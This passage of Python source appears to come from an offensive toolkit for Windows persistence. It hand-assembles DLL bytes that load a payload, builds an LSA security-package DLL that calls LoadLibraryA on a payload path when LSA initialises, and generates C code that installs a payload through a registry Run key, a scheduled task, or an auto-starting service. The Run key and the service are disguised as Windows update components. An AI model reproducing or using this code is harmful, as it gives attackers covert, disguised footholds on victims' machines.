                0x48, 0x89, 0x5C, 0x24, 0x08,  # mov [rsp+8], rbx
                0x48, 0x89, 0x6C, 0x24, 0x10,  # mov [rsp+10h], rbp
                0x48, 0x89, 0x74, 0x24, 0x18,  # mov [rsp+18h], rsi
                0x57,                            # push rdi
                0x48, 0x83, 0xEC, 0x20,         # sub rsp, 20h
                0x83, 0xFA, 0x01,               # cmp edx, 1  ; fdwReason == DLL_PROCESS_ATTACH
                0x75, 0x0A,                     # jne skip
                # Simplified - would call LoadLibrary/WinExec here
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1
                0xEB, 0x05,                     # jmp end
                # skip:
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1
                # end:
                0x48, 0x8B, 0x5C, 0x24, 0x30,  # mov rbx, [rsp+30h]
                0x48, 0x8B, 0x6C, 0x24, 0x38,  # mov rbp, [rsp+38h]
                0x48, 0x8B, 0x74, 0x24, 0x40,  # mov rsi, [rsp+40h]
                0x48, 0x83, 0xC4, 0x20,         # add rsp, 20h
                0x5F,                            # pop rdi
                0xC3                             # ret
            ])

        # Pad text section
        text_section.extend([0x90] * (0x200 - len(text_section)))  # NOP padding
        pe_file.extend(text_section)

        # .rdata section - Import table (simplified)
        rdata_section = bytearray()
        # Import descriptor for kernel32.dll
        rdata_section.extend(b'kernel32.dll\x00')
        rdata_section.extend(b'LoadLibraryA\x00')
        rdata_section.extend(b'WinExec\x00')
        # Embed payload path
        payload_bytes = payload_path.encode('utf-8') + b'\x00'
        rdata_section.extend(payload_bytes)
        # Pad
        rdata_section.extend([0] * (0x200 - len(rdata_section)))
        pe_file.extend(rdata_section)

        # .data section
        data_section = bytearray([0] * 0x200)
        pe_file.extend(data_section)

        return bytes(pe_file)

    def _create_security_package_dll(self, payload_path: str) -> Optional[bytes]:
        """Create a security package DLL."""
        # Validate payload path exists
        if not os.path.exists(payload_path):
            self.logger.error(f"Payload path does not exist: {payload_path}")
            return None

        self.logger.info(f"Creating LSA security package DLL for payload: {payload_path}")

        import struct

        # Create a minimal LSA security package DLL
        # This implements the SpLsaModeInitialize export required by LSA

        # Start with the basic DLL structure from _create_hijack_dll
        base_dll = self._create_hijack_dll(payload_path, "lsapackage")
        if not base_dll:
            return None

        # Convert to bytearray for modification
        dll_data = bytearray(base_dll)

        # Find the export directory location (simplified - would parse PE properly in production)
        # For now, we'll append our export table to the end
        export_section_offset = len(dll_data)

        # Align to section boundary
        alignment = 0x200
        if export_section_offset % alignment != 0:
            padding = alignment - (export_section_offset % alignment)
            dll_data.extend([0] * padding)
            export_section_offset = len(dll_data)

        # Export directory structure
        export_dir = bytearray()

        # IMAGE_EXPORT_DIRECTORY
        export_dir.extend(struct.pack('<I', 0))  # Characteristics
        export_dir.extend(struct.pack('<I', 0))  # TimeDateStamp
        export_dir.extend(struct.pack('<HH', 0, 0))  # Version
        export_dir.extend(struct.pack('<I', export_section_offset + 0x50))  # Name RVA
        export_dir.extend(struct.pack('<I', 1))  # Base
        export_dir.extend(struct.pack('<I', 1))  # NumberOfFunctions
        export_dir.extend(struct.pack('<I', 1))  # NumberOfNames
        export_dir.extend(struct.pack('<I', export_section_offset + 0x28))  # AddressOfFunctions
        export_dir.extend(struct.pack('<I', export_section_offset + 0x2C))  # AddressOfNames
        export_dir.extend(struct.pack('<I', export_section_offset + 0x30))  # AddressOfNameOrdinals

        # Function address table
        export_dir.extend(struct.pack('<I', 0x1000))  # SpLsaModeInitialize RVA

        # Name pointer table
        export_dir.extend(struct.pack('<I', export_section_offset + 0x60))  # Name RVA

        # Ordinal table
        export_dir.extend(struct.pack('<H', 0))  # Ordinal 0

        # Pad to name offset
        while len(export_dir) < 0x50:
            export_dir.extend([0])

        # DLL name
        export_dir.extend(b'lsapackage.dll\x00')

        # Pad to function name offset
        while len(export_dir) < 0x60:
            export_dir.extend([0])

        # Function name
        export_dir.extend(b'SpLsaModeInitialize\x00')

        # Add export section to DLL
        dll_data.extend(export_dir)

        # Update the export data directory in PE header to point to our export section
        # This is simplified - in production would properly parse and update PE structure

        # Add LSA initialization code to .text section
        # The SpLsaModeInitialize function needs to return a SECPKG_FUNCTION_TABLE
        lsa_init_code = bytearray([
            # SpLsaModeInitialize implementation
            0x48, 0x89, 0x5C, 0x24, 0x08,  # mov [rsp+8], rbx
            0x57,                            # push rdi
            0x48, 0x83, 0xEC, 0x20,         # sub rsp, 20h
            # Load payload on LSA init
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,  # lea rcx, [payload_path]
            0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,  # call [LoadLibraryA]
            # Set up function table pointer
            0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,  # lea rax, [function_table]
            0x48, 0x89, 0x01,               # mov [rcx], rax
            # Return success
            0x33, 0xC0,                     # xor eax, eax  ; STATUS_SUCCESS
            0x48, 0x8B, 0x5C, 0x24, 0x30,  # mov rbx, [rsp+30h]
            0x48, 0x83, 0xC4, 0x20,         # add rsp, 20h
            0x5F,                            # pop rdi
            0xC3                             # ret
        ])

        # Find .text section and add our code
        # This is simplified - would properly parse sections in production
        text_offset = 0x400
        if text_offset + len(lsa_init_code) < len(dll_data):
            dll_data[text_offset:text_offset + len(lsa_init_code)] = lsa_init_code

        return bytes(dll_data)

    def list_persistence_methods(self) -> List[str]:
        """Get list of available persistence methods."""
        return list(self.persistence_methods.keys())

    def generate_persistence_code(self, method: str) -> str:
        """Generate code for specific persistence method."""
        if method == 'registry_run':
            return self._generate_registry_run_code()
        elif method == 'scheduled_task':
            return self._generate_scheduled_task_code()
        elif method == 'service':
            return self._generate_service_code()
        else:
            return "// Code generation not implemented for this method"

    def _generate_registry_run_code(self) -> str:
        """Generate C code for registry Run persistence."""
        return """
// Registry Run Persistence
#include <windows.h>

BOOL SetRegistryPersistence(LPCSTR exePath) {
    HKEY hKey;
    LONG result;

    // Open registry key
    result = RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    // Set registry value
    result = RegSetValueExA(hKey, "Windows Security Update", 0, REG_SZ,
                           (BYTE*)exePath, strlen(exePath) + 1);

    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

// Usage
SetRegistryPersistence("C:\\\\Windows\\\\System32\\\\payload.exe");
"""

    def _generate_scheduled_task_code(self) -> str:
        """Generate C code for scheduled task persistence."""
        return """
// Scheduled Task Persistence
#include <windows.h>
#include <taskschd.h>

BOOL CreateScheduledTaskPersistence(LPCWSTR taskName, LPCWSTR exePath) {
    HRESULT hr;
    ITaskService *pService = NULL;
    ITaskFolder *pRootFolder = NULL;
    ITaskDefinition *pTask = NULL;
    IRegistrationInfo *pRegInfo = NULL;
    ITriggerCollection *pTriggerCollection = NULL;
    ITrigger *pTrigger = NULL;
    ILogonTrigger *pLogonTrigger = NULL;
    IActionCollection *pActionCollection = NULL;
    IAction *pAction = NULL;
    IExecAction *pExecAction = NULL;
    IRegisteredTask *pRegisteredTask = NULL;
    VARIANT varPassword;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    // Create Task Service
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                         IID_ITaskService, (void**)&pService);

    if (SUCCEEDED(hr)) {
        // Connect to task service
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

        if (SUCCEEDED(hr)) {
            // Get root folder
            hr = pService->GetFolder(_bstr_t(L"\\\\"), &pRootFolder);

            if (SUCCEEDED(hr)) {
                // Create task definition
                hr = pService->NewTask(0, &pTask);

                // Configure task (triggers, actions, etc.)
                // ... detailed task configuration code ...

                // Register task
                VariantInit(&varPassword);
                hr = pRootFolder->RegisterTaskDefinition(
                    _bstr_t(taskName), pTask, TASK_CREATE_OR_UPDATE,
                    _variant_t(), varPassword, TASK_LOGON_INTERACTIVE_TOKEN,
                    _variant_t(L""), &pRegisteredTask);
            }
        }
    }

    // Cleanup COM objects
    // ... cleanup code ...

    CoUninitialize();
    return SUCCEEDED(hr);
}
"""

    def _generate_service_code(self) -> str:
        """Generate C code for service persistence."""
        return """
// Service Persistence
#include <windows.h>

BOOL CreateServicePersistence(LPCSTR serviceName, LPCSTR displayName, LPCSTR exePath) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    BOOL success = FALSE;

    // Open Service Control Manager
    schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (schSCManager) {
        // Create service
        schService = CreateServiceA(
            schSCManager,           // SCManager database
            serviceName,            // Name of service
            displayName,            // Display name
            SERVICE_ALL_ACCESS,     // Desired access
            SERVICE_WIN32_OWN_PROCESS, // Service type
            SERVICE_AUTO_START,     // Start type
            SERVICE_ERROR_NORMAL,   // Error control type
            exePath,                // Binary path
            NULL,                   // No load ordering group
            NULL,                   // No tag identifier
            NULL,                   // No dependencies
            NULL,                   // LocalSystem account
            NULL                    // No password
        );

        if (schService) {
            // Start the service
            StartServiceA(schService, 0, NULL);
            CloseServiceHandle(schService);
            success = TRUE;
        }

        CloseServiceHandle(schSCManager);
    }

    return success;
}

// Usage
CreateServicePersistence("WinUpdateSvc", "Windows Update Service Helper",
                         "C:\\\\Windows\\\\System32\\\\payload.exe");
"""
